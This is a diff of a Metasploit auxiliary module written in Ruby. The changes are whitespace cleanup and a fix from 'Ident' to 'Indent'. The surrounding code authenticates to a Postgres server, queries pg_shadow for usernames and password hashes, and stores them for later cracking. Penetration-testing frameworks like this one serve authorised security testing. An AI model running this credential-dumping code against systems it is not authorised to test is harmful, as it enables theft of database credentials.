@@ -25,7 +25,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Version'        => '$Revision$',
 			'Description'    => %Q{
 					This module extracts the usernames and encrypted password
-				hashes from a Postgres server and stores them for later cracking.				
+				hashes from a Postgres server and stores them for later cracking.
 			},
 			'Author'         => ['TheLightCosine <thelightcosine[at]gmail.com>'],
 			'License'        => MSF_LICENSE
@@ -34,14 +34,14 @@ class Metasploit3 < Msf::Auxiliary
 			OptString.new('DATABASE', [ true, 'The database to authenticate against', 'postgres']),
 			])
 		deregister_options('SQL', 'RETURN_ROWSET', 'VERBOSE')
-		
+
 	end
 
 	def run_host(ip)
-		
+
 		#Query the Postgres Shadow table for username and password hashes and report them
 		res = postgres_query('SELECT usename, passwd FROM pg_shadow',false)
-		
+
 		#Error handling routine here, borrowed heavily from todb
 		case res.keys[0]
 		when :conn_error
@@ -59,21 +59,21 @@ class Metasploit3 < Msf::Auxiliary
 		when :complete
 			print_status("Query appears to have run successfully")
 		end
-		
+
 		this_service = report_service(
 					:host  => datastore['RHOST'],
 					:port => datastore['RPORT'],
 					:name => 'postgres',
 					:proto => 'tcp'
 					)
-		
+
 		tbl = Rex::Ui::Text::Table.new(
 			'Header'  => 'Postgres Server Hashes',
-			'Ident'   => 1,
+			'Indent'   => 1,
 			'Columns' => ['Username', 'Hash']
 		)
 
-	
+
 
 		res[:complete].rows.each do |row|
 			next if row[0].nil? or row[1].nil?
@@ -93,11 +93,11 @@ class Metasploit3 < Msf::Auxiliary
 		filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_postgreshashes.txt"
 		path = store_loot("postgres.hashes", "text/plain", datastore['RHOST'], hashtable, filename, "Postgres Hashes",service)
 		print_status("Hash Table has been saved: #{path}")
-	
+
 	end
 
 
 
-	
+
 end
 
